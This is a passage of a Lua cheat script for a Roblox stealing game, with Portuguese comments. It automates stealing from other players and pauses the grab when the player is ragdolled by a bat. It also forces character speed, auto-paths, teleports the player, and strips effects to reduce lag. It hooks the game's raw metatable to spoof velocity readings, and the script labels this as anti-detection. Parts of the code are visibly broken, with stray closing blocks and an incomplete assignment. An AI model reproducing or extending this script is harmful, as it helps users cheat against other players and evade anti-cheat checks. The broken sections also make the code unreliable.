        for _,d in pairs(M.cache) do d.ready=true end
        resetBar()
    end
    function M.setMode(mode)
        if mode=="v3" or mode=="V3" then mode="Normal" elseif mode=="v2" or mode=="V2" then mode="Semi" end
        selectedStealMode=(mode=="Semi") and "Semi" or "Normal"
        Steal.StealRadius=tonumber(autoStealRadius) or AceStealRadii[selectedStealMode]
        if progressRadLbl then progressRadLbl.Text=string.format("Radius: %.0f",Steal.StealRadius) end
        if autoStealEnabled then M.start() end
    end
    return M
end)()

-- RAGDOLL GRAB portado do Mystery: golpe de morcego pausa o grab por 1.5s
-- e o retoma sem alterar a opção Auto Steal escolhida pelo usuário.
 RagdollGrab = (function()
    local R = {conn=nil, window=nil, wasRagdolled=false, lastTrigger=0, clearSince=0, lockUntil=0, guard=0}
    local REENABLE_TIME, HIT_LOCK, COOLDOWN = 1.5, 3.3, 1.2
    local function isRagdolled(hum)
        local state=hum:GetState()
        if state==Enum.HumanoidStateType.Physics or state==Enum.HumanoidStateType.Ragdoll or state==Enum.HumanoidStateType.FallingDown then return true end
        local endTime=LP:GetAttribute("RagdollEndTime")
        return type(endTime)=="number" and endTime>workspace:GetServerTimeNow()
    end
    local function hasBat(name)
        if type(name)~="string" then return false end
        name=name:lower(); return name:find("bat")~=nil or name:find("morcego")~=nil or name:find("slap")~=nil
    end
    local function opponentWithBatNearby()
        local char=LP.Character; local root=char and char:FindFirstChild("HumanoidRootPart")
        if not root then return false end
        for _,plr in ipairs(Players:GetPlayers()) do
            if plr~=LP and plr.Character then
                local otherRoot=plr.Character:FindFirstChild("HumanoidRootPart")
                if otherRoot and (otherRoot.Position-root.Position).Magnitude<=20 then
                    for _,tool in ipairs(plr.Character:GetChildren()) do
                        if tool:IsA("Tool") and hasBat(tool.Name) then return true end
                    end
                end
            end
        end
        return false
    end
    local function restore()
        R.window=nil; ragdollGrabPaused=false
        if autoStealEnabled and not MysteryGrab.scan then MysteryGrab.start() end
    end
    function R.clear()
        R.guard=R.guard+1
        if R.window then restore() else ragdollGrabPaused=false end
    end
    function R.start(char)
        if R.conn then pcall(function() R.conn:Disconnect() end); R.conn=nil end
        R.clear(); R.wasRagdolled=false; R.lastTrigger=0; R.clearSince=0; R.lockUntil=0
        R.conn=RunService.Heartbeat:Connect(function()
            if not S.ragdollStealEnabled then
                R.wasRagdolled=false; R.lockUntil=0
                if R.window then restore() end
                return
            end
            local hum=char and char.Parent and char:FindFirstChildOfClass("Humanoid")
            if not hum then return end
            local now=os.clock(); local rag=isRagdolled(hum) and opponentWithBatNearby()
            if rag then R.clearSince=0 else
                if R.clearSince==0 then R.clearSince=now end
                if now-R.clearSince<0.6 then rag=R.wasRagdolled end
            end
            if now<R.lockUntil then rag=true elseif not rag then R.lockUntil=0 end
            if rag and not R.wasRagdolled and now>=R.lockUntil and now-R.lastTrigger>=COOLDOWN then
                R.lastTrigger=now; R.lockUntil=now+HIT_LOCK
                if autoStealEnabled and not R.window then
                    ragdollGrabPaused=true; MysteryGrab.stop(false)
                    R.window={t0=now, reenable=REENABLE_TIME}; R.guard=R.guard+1
                    local guard=R.guard
                    task.delay(REENABLE_TIME+0.05,function() if guard==R.guard and R.window then restore() end end)
                end
            end
            R.wasRagdolled=rag
            if R.window and now-R.window.t0>=R.window.reenable then restore() end
        end)
    end
    function R.ready()
        if not S.ragdollStealEnabled then if R.window then restore() end; return true end
        if not R.window then return true end
        if os.clock()-R.window.t0>=R.window.reenable then restore(); return true end
        return false
    end
     end
    end)
    return R
end)()
_G.RagdollStealReady=function() return RagdollGrab.ready() end
_G._K7RagdollStealClear=function() RagdollGrab.clear() end
_G._K7StartRagdollSystems=function(char) RagdollGrab.start(char) end

 function syncStealAliases() Steal.AutoStealEnabled=autoStealEnabled; Steal.StealRadius=tonumber(autoStealRadius) or Steal.StealRadius or AceStealRadii[selectedStealMode] or 63; Steal.AutoGrabStopEnabled=autoGrabStopEnabled; Steal.AutoGrabStopTime=autoGrabStopTime; Steal.AutoGrabDelayRadius=autoGrabDelayRadius end
resetProgressBar=function() if progressPct then progressPct.Text="0%" end if progressFill then progressFill.Size=UDim2.new(0,0,1,0); progressFill.BackgroundColor3=getFillColor() end end
setupStealBarAPI=function() end
startAutoSteal=function() MysteryGrab.start(); syncStealAliases() end
stopAutoSteal=function() MysteryGrab.stop(true); syncStealAliases() end
AceAutoStealSync=function() if autoStealEnabled then startAutoSteal() else stopAutoSteal() end end
 Conns = {batCounter=nil,anchor={},progress=nil};  MEDUSA_COOLDOWN,batCounterDebounce = 25,false;  lastMoveDir = Vector3.new(0,0,0)  MOVE_KEYS={[Enum.KeyCode.W]=true,[Enum.KeyCode.A]=true,[Enum.KeyCode.S]=true,[Enum.KeyCode.D]=true, [Enum.KeyCode.Up]=true,[Enum.KeyCode.Left]=true,[Enum.KeyCode.Right]=true,[Enum.KeyCode.Down]=true} -- ========================================================
-- [ADAPT SPEED ENGINE & VELOCITY CONTROLLER]
-- Portado diretamente do Adapt (REAL_adapt_printed_organized.txt)
-- ========================================================

-- Tabela de modos de velocidade estilo Adapt (tbl22)
local _AdaptSpeedCfg = {
    NS = 60,
    CS = 29,
    PL = 70,
    LG_N = 24.5,
    LG_C = 15,
    family = "normal", -- "normal", "lagger", "pinglagger"
    carry = false,
}

function F.getActiveMoveSpeed()
    local normalSpd = tonumber(NS) or _AdaptSpeedCfg.NS
    local carrySpd = tonumber(CS) or _AdaptSpeedCfg.CS
    local laggerNorm = tonumber(S.LAGGER_SPEED) or _AdaptSpeedCfg.LG_N
    local laggerCarry = tonumber(S.LAGGER_CARRY_SPEED) or _AdaptSpeedCfg.LG_C

    if _G._AdaptAutoPathActive and not _G._AdaptAutoPathMatchSpeed then
        return normalSpd
    end

    if S.laggerToggled == true or _AdaptSpeedCfg.family == "lagger" then
        if S.laggerPhase == 2 or S.speedMode == true or _AdaptSpeedCfg.carry then
            return laggerCarry
        end
        return laggerNorm
    end

    if _AdaptSpeedCfg.family == "pinglagger" then
        return tonumber(S.PING_LAGGER_SPEED) or _AdaptSpeedCfg.PL
    end

    if S.speedMode == true or _AdaptSpeedCfg.carry then
        return carrySpd
    end

    return normalSpd
end

function F.getAutoPathSpeed()
    return tonumber(NS) or tonumber(S.NS) or 59.5
end

function F.isRagdollState(hum)
    if not hum then return true end
    if S.antiRagdollEnabled then return false end
    local st = hum:GetState()
    return hum.PlatformStand or st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll or st == Enum.HumanoidStateType.FallingDown
end

function F.isMyPlotByName(plotName)
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return false end
    local plot = plots:FindFirstChild(plotName)
    if not plot then return false end
    local sign = plot:FindFirstChild("PlotSign")
    if sign then
        local yb = sign:FindFirstChild("YourBase")
        if yb and yb:IsA("BillboardGui") then
            return yb.Enabled == true
        end
    end
    return false
end

-- Adapt Metatable Velocity Spoofing (Anti-Drop / Anti-Detection)
do
    pcall(function()
        if _G._AdaptVelocitySpoofHooked then return end
        local spoofVector = Vector3.zero
        local mt = getrawmetatable(game)
        if not mt then return end
        setreadonly(mt, false)
        local oldIndex = mt.__index
        local oldNewIndex = mt.__newindex

        mt.__index = newcclosure(function(self, prop)
            if not checkcaller() then
                local propStr = tostring(prop)
                if propStr == "AssemblyLinearVelocity" or propStr == "Velocity" then
                    if typeof(self) == "Instance" and self:IsA("BasePart") then
                        local name = self.Name
                        if name == "HumanoidRootPart" or name == "Torso" or name == "UpperTorso" then
                            local char = LP.Character
                            if char and self:IsDescendantOf(char) then
                                return spoofVector
                            end
                        end
                    end
                end
            end
            return oldIndex(self, prop)
        end)

        mt.__newindex = newcclosure(function(self, prop, val)
            if not checkcaller() then
                local propStr = tostring(prop)
                if propStr == "AssemblyLinearVelocity" or propStr == "Velocity" then
                    if typeof(self) == "Instance" and self:IsA("BasePart") then
                        local name = self.Name
                        if name == "HumanoidRootPart" or name == "Torso" or name == "UpperTorso" then
                            local char = LP.Character
                            if char and self:IsDescendantOf(char) then
                                spoofVector = val
                                return
                            end
                        end
                    end
                end
            end
            return oldNewIndex(self, prop, val)
        end)

        setreadonly(mt, true)
        _G._AdaptVelocitySpoofHooked = true
    end)
end

-- Adapt Speed Controller Runner (fn44 com isolamento de sessão)
local function initAdaptSpeedController(sessionId)
    if _G._AdaptSpeedControllerConn then
        pcall(function() _G._AdaptSpeedControllerConn:Disconnect() end)
        _G._AdaptSpeedControllerConn = nil
    end

    _G._AdaptSpeedControllerSession = sessionId

    _G._AdaptSpeedControllerConn = RunService.RenderStepped:Connect(function()
        if _G._AdaptSpeedControllerSession ~= sessionId then
            return
        end

        local character = LP.Character
        if not character then return end

        local hum = character:FindFirstChildOfClass("Humanoid")
        local root = character:FindFirstChild("HumanoidRootPart")
        if not hum or not root or hum.Health <= 0 then return end

        if _G._AdaptAntiDropEnabled == true or dropActive == true then
            return
        end

        local controlled = not S.autoBatEnabled and not S.autoLeftEnabled and not S.autoRightEnabled and not tpBatEnabled and not aimbotEnabled and not S.antiBatBypassEnabled
        _G._ZombieAntiBatMovementBlocked = not controlled

        if not controlled then
            _G._AmbitiousAntiBatDesiredXZ = nil
            return
        end

        local state = hum:GetState()
        if hum.PlatformStand or state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown then
            lastMoveDir = Vector3.zero
            _G._AmbitiousAntiBatDesiredXZ = nil
            return
        end

        local moveDirection = hum.MoveDirection
        local targetSpeed = math.clamp(tonumber(F.getActiveMoveSpeed()) or 0, 0, 10000)

        if moveDirection.Magnitude > 0 and not _G._AmbitiousAntiBatSpiking then
            lastMoveDir = Vector3.new(moveDirection.X, 0, moveDirection.Z).Unit
            _G._AmbitiousAntiBatDesiredXZ = lastMoveDir * targetSpeed
            root.Velocity = Vector3.new(moveDirection.X * targetSpeed, root.Velocity.Y, moveDirection.Z * targetSpeed)
        else
            _G._AmbitiousAntiBatDesiredXZ = Vector3.zero
        end

        if S.speedLabel then
            local velocity = root.AssemblyLinearVelocity
            S.speedLabel.Text = string.format("Speed: %.1f", Vector3.new(velocity.X, 0, velocity.Z).Magnitude)
        end
    end)
end

local sessionKey = tostring(math.random(100000, 999999)) .. "_" .. tostring(os.clock())
initAdaptSpeedController(sessionKey)

 alConn,arConn=nil,nil  alPhase,arPhase=1,1 function F.stopAutoLeft() if alConn then alConn:Disconnect();alConn=nil end;alPhase=1 local char=LP.Character;if char then local h=char:FindFirstChildOfClass("Humanoid");if h then h:Move(Vector3.zero,false) end end if S.autoLeftSetVisual then S.autoLeftSetVisual(false) end F.destroyProxy() end function F.stopAutoRight() if arConn then arConn:Disconnect();arConn=nil end;arPhase=1 local char=LP.Character;if char then local h=char:FindFirstChildOfClass("Humanoid");if h then h:Move(Vector3.zero,false) end end
if S.autoRightSetVisual then S.autoRightSetVisual(false) end F.destroyProxy() end function F.startAutoLeft() if alConn then alConn:Disconnect() end;alPhase=1 alConn=RunService.Heartbeat:Connect(function() if not S.autoLeftEnabled then return end local char=LP.Character;if not char then return end; local hrp=char:FindFirstChild("HumanoidRootPart"); local hum=char:FindFirstChildOfClass("Humanoid") if not hrp or not hum then return end if F.isRagdollState(hum) then hum:Move(Vector3.zero,false);return end local spd=F.getAutoPathSpeed(); local proxy = F.ensureProxy() if not proxy then return end
if alPhase==1 then local tgt=Vector3.new(AP_L1.X,hrp.Position.Y,AP_L1.Z) if (tgt-hrp.Position).Magnitude<1 then alPhase=2; local d=AP_L2-hrp.Position;local mv=Vector3.new(d.X,0,d.Z).Unit; hum:Move(mv,false); proxy.AssemblyLinearVelocity=Vector3.new(mv.X*spd, hrp.Velocity.Y, mv.Z*spd) return end local d=AP_L1-hrp.Position;local mv=Vector3.new(d.X,0,d.Z).Unit; hum:Move(mv,false); proxy.AssemblyLinearVelocity=Vector3.new(mv.X*spd, hrp.Velocity.Y, mv.Z*spd) elseif alPhase==2 then local tgt=Vector3.new(AP_L2.X,hrp.Position.Y,AP_L2.Z) if (tgt-hrp.Position).Magnitude<1 then
hum:Move(Vector3.zero,false); proxy.AssemblyLinearVelocity=Vector3.zero S.autoLeftEnabled=false;if alConn then alConn:Disconnect();alConn=nil end; alPhase=1;if S.autoLeftSetVisual then S.autoLeftSetVisual(false) end; F.destroyProxy() return end local d=AP_L2-hrp.Position;local mv=Vector3.new(d.X,0,d.Z).Unit; hum:Move(mv,false); proxy.AssemblyLinearVelocity=Vector3.new(mv.X*spd, hrp.Velocity.Y, mv.Z*spd) end end) end function F.startAutoRight() if arConn then arConn:Disconnect() end;arPhase=1 arConn=RunService.Heartbeat:Connect(function() if not S.autoRightEnabled then return end
local char=LP.Character;if not char then return end; local hrp=char:FindFirstChild("HumanoidRootPart"); local hum=char:FindFirstChildOfClass("Humanoid") if not hrp or not hum then return end if F.isRagdollState(hum) then hum:Move(Vector3.zero,false);return end local spd=F.getAutoPathSpeed(); local proxy = F.ensureProxy() if not proxy then return end if arPhase==1 then local tgt=Vector3.new(AP_R1.X,hrp.Position.Y,AP_R1.Z) if (tgt-hrp.Position).Magnitude<1 then
arPhase=2; local d=AP_R2-hrp.Position;local mv=Vector3.new(d.X,0,d.Z).Unit; hum:Move(mv,false); proxy.AssemblyLinearVelocity=Vector3.new(mv.X*spd, hrp.Velocity.Y, mv.Z*spd) return end local d=AP_R1-hrp.Position;local mv=Vector3.new(d.X,0,d.Z).Unit; hum:Move(mv,false); proxy.AssemblyLinearVelocity=Vector3.new(mv.X*spd, hrp.Velocity.Y, mv.Z*spd) elseif arPhase==2 then local tgt=Vector3.new(AP_R2.X,hrp.Position.Y,AP_R2.Z) if (tgt-hrp.Position).Magnitude<1 then hum:Move(Vector3.zero,false); proxy.AssemblyLinearVelocity=Vector3.zero
S.autoRightEnabled=false;if arConn then arConn:Disconnect();arConn=nil end; arPhase=1;if S.autoRightSetVisual then S.autoRightSetVisual(false) end; F.destroyProxy() return end local d=AP_R2-hrp.Position;local mv=Vector3.new(d.X,0,d.Z).Unit; hum:Move(mv,false); proxy.AssemblyLinearVelocity=Vector3.new(mv.X*spd, hrp.Velocity.Y, mv.Z*spd) end end) end function F.setupSpeedIndicator(char) S.speedLabel = nil pcall(function() local head = char and (char:FindFirstChild("Head") or char:WaitForChild("Head", 5)) if head then local oldBb = head:FindFirstChild("CursedSpeedBillboard") while oldBb do
oldBb:Destroy(); oldBb = head:FindFirstChild("CursedSpeedBillboard") end end end) end function F.startUnwalk() local c=LP.Character;if not c then return end; local hum=c:FindFirstChildOfClass("Humanoid") if hum then for _,t in ipairs(hum:GetPlayingAnimationTracks()) do t:Stop() end end local anim=c:FindFirstChild("Animate") if anim then S.unwalkSavedAnimate=anim:Clone();anim:Destroy() end end function F.stopUnwalk() local c=LP.Character if c and S.unwalkSavedAnimate then S.unwalkSavedAnimate:Clone().Parent=c;S.unwalkSavedAnimate=nil end end
 dropActive = false;  DROP_ASCEND_DURATION = 0.25;  DROP_ASCEND_SPEED = 240;  _dropConn = nil  function _dropSetBtn(state) pcall(function() local entry = (_G.VersincMobileButtonRefs or {}).drop if entry and entry.setActive then entry.setActive(state and true or false) end end) end function F.dropTeleportToFloor(char, hum, root) if not root then return false end local ok = false pcall(function() local params = RaycastParams.new() params.FilterDescendantsInstances = { char } params.FilterType = Enum.RaycastFilterType.Exclude params.IgnoreWater = true
local origin = root.Position + Vector3.new(0, 5, 0) local result = workspace:Raycast(origin, Vector3.new(0, -2000, 0), params) if result and result.Position then local offset = ((hum and hum.HipHeight) or 2) + (root.Size.Y / 2) + 0.05 root.CFrame = CFrame.new(root.Position.X, result.Position.Y + offset, root.Position.Z) ok = true elseif root.Position.Y < -100 then root.CFrame = CFrame.new(root.Position.X, 5, root.Position.Z) end root.AssemblyLinearVelocity = Vector3.zero root.AssemblyAngularVelocity = Vector3.zero
if hum and hum.Health > 0 then hum:ChangeState(Enum.HumanoidStateType.Running) end end) return ok end function F.stopAutoTPForAction() if S.autoTPEnabled then pcall(function() if F.stopAutoTP then F.stopAutoTP() end end) S.autoTPEnabled = false pcall(function() if VS and VS.setAutoTPVisual then VS.setAutoTPVisual(false) end end) pcall(function() if F.saveConfig then F.saveConfig() end end) end end function F.runDrop() if dropActive or S.dropActive then return end F.stopAutoTPForAction() local char = LP.Character local hum  = char and char:FindFirstChildOfClass("Humanoid")
local root = char and char:FindFirstChild("HumanoidRootPart") if not char or not hum or not root or hum.Health <= 0 then return end dropActive = true; S.dropActive = true _dropSetBtn(true) local t0 = tick() local duration = tonumber(DROP_ASCEND_DURATION) or 0.25 local speed = tonumber(DROP_ASCEND_SPEED) or 240 if _dropConn then pcall(function() _dropConn:Disconnect() end); _dropConn = nil end local function finish() dropActive = false; S.dropActive = false _dropSetBtn(false) end _dropConn = RunService.Heartbeat:Connect(function() local currentChar = LP.Character
local r  = currentChar and currentChar:FindFirstChild("HumanoidRootPart") local ch = currentChar and currentChar:FindFirstChildOfClass("Humanoid") if not r or not ch or ch.Health <= 0 or not dropActive then if _dropConn then _dropConn:Disconnect(); _dropConn = nil end finish() return end if tick() - t0 >= duration then if _dropConn then _dropConn:Disconnect(); _dropConn = nil end r.AssemblyLinearVelocity = Vector3.zero r.AssemblyAngularVelocity = Vector3.zero F.dropTeleportToFloor(currentChar, ch, r) finish() return end
r.AssemblyLinearVelocity = Vector3.new(r.AssemblyLinearVelocity.X, speed, r.AssemblyLinearVelocity.Z) end) end function F.stopDrop() dropActive = false; S.dropActive = false if _dropConn then pcall(function() _dropConn:Disconnect() end); _dropConn = nil end _dropSetBtn(false) end LP.CharacterRemoving:Connect(function() F.stopDrop() end) function F.doAutoTPDown(force) local char=LP.Character;if not char then return end; local hrp=char:FindFirstChild("HumanoidRootPart");if not hrp then return end; local hum2=char:FindFirstChildOfClass("Humanoid");if not hum2 then return end if not force then
if hum2.FloorMaterial~=Enum.Material.Air then return end if hrp.Position.Y<S.autoTPHeight then return end end hrp.CFrame=CFrame.new(hrp.Position.X,-7.00,hrp.Position.Z) *CFrame.Angles(0,select(2,hrp.CFrame:ToEulerAnglesYXZ()),0) hrp.AssemblyLinearVelocity=Vector3.zero end function F.startAutoTP() if S.autoTPConn then task.cancel(S.autoTPConn);S.autoTPConn=nil end S.autoTPConn= end end) end function F.stopAutoTP() S.autoTPEnabled=false
if S.autoTPConn then task.cancel(S.autoTPConn);S.autoTPConn=nil end end function F.runTPFloor() pcall(function() F.doAutoTPDown(true) end) end defLightBrightness,defLightClock,defLightAmbient = nil  function F.applyAntiLagDerender(obj) pcall(function() if obj:IsA("Beam") or obj:IsA("Attachment") or obj:IsA("Highlight") or obj:IsA("BillboardGui") then local n = (obj.Name or ""):lower() if n:find("versinc") or n:find("tracer") or n:find("lineesp") or n:find("sevenup") or n:find("playeresp") then return end local p = obj.Parent while p do local pn = (p.Name or ""):lower()
if pn:find("versinc") or pn:find("tracer") or pn == "versinctracers" or pn:find("esp") then return end p = p.Parent end end if obj:IsA("BasePart") then obj.Material = Enum.Material.Plastic; obj.Reflectance = 0; obj.CastShadow = false elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then obj.Enabled = false elseif obj:IsA("PointLight") or obj:IsA("SpotLight") or obj:IsA("SurfaceLight") then obj.Enabled = false elseif obj:IsA("Decal") or obj:IsA("Texture") then
if not (obj.Name == "face" and obj.Parent and obj.Parent.Name == "Head") then pcall(function() obj:Destroy() end) end elseif obj:IsA("SurfaceAppearance") then pcall(function() obj:Destroy() end) elseif obj:IsA("Accessory") or obj:IsA("Hat") then for _, d in ipairs(obj:GetDescendants()) do if d:IsA("BasePart") then d.CastShadow = false; d.Material = Enum.Material.Plastic end end elseif obj:IsA("Animator") and obj.Parent and obj.Parent.Parent ~= LP.Character then pcall(function() obj:Destroy() end) elseif obj:IsA("PostEffect") or obj:IsA("BlurEffect") or obj:IsA("SunRaysEffect")
or obj:IsA("ColorCorrectionEffect") or obj:IsA("BloomEffect") or obj:IsA("DepthOfFieldEffect") or obj:IsA("Atmosphere") or obj:IsA("Clouds") then obj.Enabled = false end end) end function F.enableAntiLag() S.antiLagEnabled = true; defLightBrightness = defLightBrightness or Lighting.Brightness; defLightClock = defLightClock or Lighting.ClockTime; defLightAmbient = defLightAmbient or Lighting.OutdoorAmbient pcall(function() Lighting.GlobalShadows = false Lighting.FogEnd = 1e10; Lighting.Brightness = 1; Lighting.EnvironmentDiffuseScale = 0; Lighting.EnvironmentSpecularScale = 0
settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 end) for _, e in ipairs(Lighting:GetDescendants()) do pcall(function() if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") or e:IsA("Atmosphere") or e:IsA("Clouds") or e:IsA("PostEffect") then e.Enabled = false end end) end for _, obj in ipairs(workspace:GetDescendants()) do if S.antiLagEnabled then F.applyAntiLagDerender(obj) end end if S.antiLagDescConn then S.antiLagDescConn:Disconnect() end
S.antiLagDescConn = workspace.DescendantAdded:Connect(function(obj) if not S.antiLagEnabled then return end task.defer(function() F.applyAntiLagDerender(obj) end) end) end function F.disableAntiLag() S.antiLagEnabled = false if S.antiLagDescConn then S.antiLagDescConn:Disconnect(); S.antiLagDescConn = nil end pcall(function() if defLightBrightness then Lighting.Brightness = defLightBrightness end if defLightClock then Lighting.ClockTime = defLightClock end if defLightAmbient then Lighting.OutdoorAmbient = defLightAmbient end Lighting.GlobalShadows = true; Lighting.ExposureCompensation = 0
settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic for _, e in ipairs(Lighting:GetDescendants()) do pcall(function() if e:IsA("PostEffect") or e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") or e:IsA("Atmosphere") or e:IsA("Clouds") then e.Enabled = true end end) end end) end -- SWORD EDITOR (ported from Zombie.vs Mobile)
 ToolEditor = { tracked = {}, watchers = {}, soundTracked = {}, soundWatchers = {}, rainbowConn = nil }
 TOOL_ASSETS = {
DiamondSword = { cat="Bat", label="Diamond Sword", mesh="rbxassetid://8827558932", tex="rbxassetid://8827558969", scale=Vector3.new(0.2,0.2,0.2), view=4.9, c0=CFrame.new(-0.05,-0.1,-0.12)*CFrame.Angles(math.rad(90),math.rad(180),300) },
Katana = { cat="Bat", label="Katana", mesh="rbxassetid://13528902482", tex="rbxassetid://13528902373", scale=Vector3.new(1.4,1.4,1.4), view=6.6, c0=CFrame.new(0,0.6,0)*CFrame.Angles(math.rad(270),math.rad(180),math.rad(180)) },
Skull = { cat="Medusa", label="Skull", mesh="rbxassetid://2050312704", tex="rbxassetid://2050313393", scale=Vector3.new(1,1,1), view=4.2, c0=CFrame.new(0,0.65,-0.4)*CFrame.Angles(math.rad(330),0,0) },
GoldenDesertEagle = { cat="Medusa", label="Golden Desert Eagle", mesh="rbxassetid://430251413", tex="rbxassetid://435840335", scale=Vector3.new(0.01,0.01,0.01), view=3.0, c0=CFrame.new(0,0,-0.8)*CFrame.Angles(math.rad(330),math.rad(180),0) },
}
 TOOL_ORDER = { Bat={"DiamondSword","Katana"}, Medusa={"Skull","GoldenDesertEagle"} }
 TOOL_SOUNDS = { Bat={id="rbxassetid://5713085119",skip=0.2}, Medusa={id="rbxassetid://3102797479",doublePlay=true,delay=0.5} }
S.customToolSkinBat = S.customToolSkinBat or "DiamondSword"; S.customToolSkinMedusa = S.customToolSkinMedusa or "GoldenDesertEagle"
 function toolCategory(inst)
if not inst or not inst:IsA("Tool") then return nil end local n=inst.Name:lower()
if n:find("bat") or n:find("slap") then return "Bat" end
if n:find("medusa") or n:find("head") or n:find("stone") then return "Medusa" end return nil end
 function chosenSkin(cat) local key=(cat=="Bat") and S.customToolSkinBat or S.customToolSkinMedusa local d=TOOL_ASSETS[key] if d and d.cat==cat then return key end return TOOL_ORDER[cat][1] end
 function eachTool(fn) local bp=LP:FindFirstChildOfClass("Backpack") for _,box in ipairs({LP.Character,bp}) do if box then for _,v in ipairs(box:GetChildren()) do if toolCategory(v) then fn(v) end end end end end
 function disconnectList(list) for _,c in ipairs(list or {}) do pcall(function() c:Disconnect() end) end end
 function clearReplica(tool,restore) local e=ToolEditor.tracked[tool] local h=tool and tool:FindFirstChild("Handle") if h then local r=h:FindFirstChild("ZombieVS_ToolReplica") if r then r:Destroy() end end if e then disconnectList(e.conns) if restore then for obj,val in pairs(e.original or {}) do if obj and obj.Parent then pcall(function() obj.Transparency=val end) end end end ToolEditor.tracked[tool]=nil end end
 function addHidden(e,d) if d.Name=="ZombieVS_ToolReplica" or d:FindFirstAncestor("ZombieVS_ToolReplica") then return end if d:IsA("BasePart") or d:IsA("Decal") or d:IsA("Texture") then if e.original[d]==nil then e.original[d]=d.Transparency end pcall(function() d.Transparency=1 end) end end
 function buildReplica(tool)
local cat=toolCategory(tool); if not cat then return end local h=tool:FindFirstChild("Handle"); if not h or not h:IsA("BasePart") then return end
clearReplica(tool,true); local e={original={},conns={},cat=cat}; ToolEditor.tracked[tool]=e
for _,d in ipairs(tool:GetDescendants()) do addHidden(e,d) end
local data=TOOL_ASSETS[chosenSkin(cat)]; local m=Instance.new("Model");m.Name="ZombieVS_ToolReplica";m.Parent=h
local p=Instance.new("Part");p.Name="MainPart";p.Size=Vector3.new(1,1,1);p.Transparency=0;p.Anchored=false;p.CanCollide=false;p.CanTouch=false;p.CanQuery=false;p.Massless=true;p.Parent=m
local mesh=Instance.new("SpecialMesh");mesh.MeshType=Enum.MeshType.FileMesh;mesh.MeshId=data.mesh;mesh.TextureId=data.tex;mesh.Scale=data.scale;mesh.Parent=p
local w=Instance.new("Motor6D");w.Part0=h;w.Part1=p;w.C0=data.c0;w.Parent=p
local trailA=Instance.new("Attachment");trailA.Position=Vector3.new(0,0.5,0);trailA.Parent=p local trailB=Instance.new("Attachment");trailB.Position=Vector3.new(0,-0.5,0);trailB.Parent=p
local trail=Instance.new("Trail");trail.Name="SwordTrail";trail.Attachment0=trailA;trail.Attachment1=trailB;trail.Lifetime=0.18;trail.LightEmission=0.55;trail.Parent=p
e.conns[#e.conns+1]=tool.DescendantAdded:Connect(function(d) task.defer(function() if ToolEditor.tracked[tool] then addHidden(e,d) end end) end)
end
 function refreshTools() if not S.customToolsEnabled then return end eachTool(function(t) if not ToolEditor.tracked[t] then buildReplica(t) else local e=ToolEditor.tracked[t];for d in pairs(e.original) do if d.Parent and d.Transparency~=1 then d.Transparency=1 end end local h=t:FindFirstChild("Handle");if not h or not h:FindFirstChild("ZombieVS_ToolReplica") then buildReplica(t) end end end) end
 function setCustomTools(on) S.customToolsEnabled=on==true if S.customToolsEnabled then refreshTools() else for t in pairs(ToolEditor.tracked) do clearReplica(t,true) end end end
 function setSkin(cat,key) local d=TOOL_ASSETS[key];if not d or d.cat~=cat then return end if cat=="Bat" then S.customToolSkinBat=key else S.customToolSkinMedusa=key end if S.customToolsEnabled then eachTool(function(t) if toolCategory(t)==cat then buildReplica(t) end end) end F.saveConfig() end
 function applyTransparency(on) S.transparentToolsEnabled=on==true eachTool(function(t) for _,d in ipairs(t:GetDescendants()) do if d:IsA("BasePart") and not d:FindFirstAncestor("ZombieVS_ToolReplica") then if d:GetAttribute("ZombieVS_OriginalTransparency")==nil then d:SetAttribute("ZombieVS_OriginalTransparency",d.Transparency) end d.Transparency=on and 0.5 or (d:GetAttribute("ZombieVS_OriginalTransparency") or 0) end end end) end
 function stopRainbow() if ToolEditor.rainbowConn then ToolEditor.rainbowConn:Disconnect();ToolEditor.rainbowConn=nil end eachTool(function(t) for _,d in ipairs(t:GetDescendants()) do if d:IsA("BasePart") and d:GetAttribute("ZombieVS_R") then d.Color=Color3.new(d:GetAttribute("ZombieVS_R"),d:GetAttribute("ZombieVS_G"),d:GetAttribute("ZombieVS_B"));d:SetAttribute("ZombieVS_R",nil);d:SetAttribute("ZombieVS_G",nil);d:SetAttribute("ZombieVS_B",nil) end end end) end
 function setRainbow(on) S.rainbowToolsEnabled=on==true stopRainbow() if not on then return end local acc=0 ToolEditor.rainbowConn=RunService.Heartbeat:Connect(function(dt) acc=acc+dt;if acc<0.025 then return end;acc=0 local hue=(tick()*0.35)%1;eachTool(function(t) local i=0 for _,d in ipairs(t:GetDescendants()) do if d:IsA("BasePart") then i=i+1;if d:GetAttribute("ZombieVS_R")==nil then d:SetAttribute("ZombieVS_R",d.Color.R);d:SetAttribute("ZombieVS_G",d.Color.G);d:SetAttribute("ZombieVS_B",d.Color.B) end d.Color=Color3.fromHSV((hue+i*0.035)%1,1,1) elseif d:IsA("Trail") or d:IsA("ParticleEmitter") or d:IsA("Beam") then d.Color=ColorSequence.new(Color3.fromHSV((hue+i*0.035)%1,1,1)) end end end) end) end
 function clearSound(tool) local e=ToolEditor.soundTracked[tool];if not e then return end if e.timer then pcall(task.cancel,e.timer) end disconnectList(e.conns) if e.custom then e.custom:Destroy() end for s,v in pairs(e.volumes) do if s.Parent then s.Volume=v end end ToolEditor.soundTracked[tool]=nil end
 function hookSounds(tool)
if ToolEditor.soundTracked[tool] then return end local cat=toolCategory(tool);local data=cat and TOOL_SOUNDS[cat];local h=tool:FindFirstChild("Handle");if not data or not h then return end
local cs=Instance.new("Sound");cs.Name="ZombieVS_CustomSound";cs.SoundId=data.id;cs.Volume=1;cs.RollOffMode=Enum.RollOffMode.Inverse;cs.MaxDistance=1000;cs.MinDistance=1000;cs.Parent=h
local e={custom=cs,data=data,conns={},volumes={}};ToolEditor.soundTracked[tool]=e
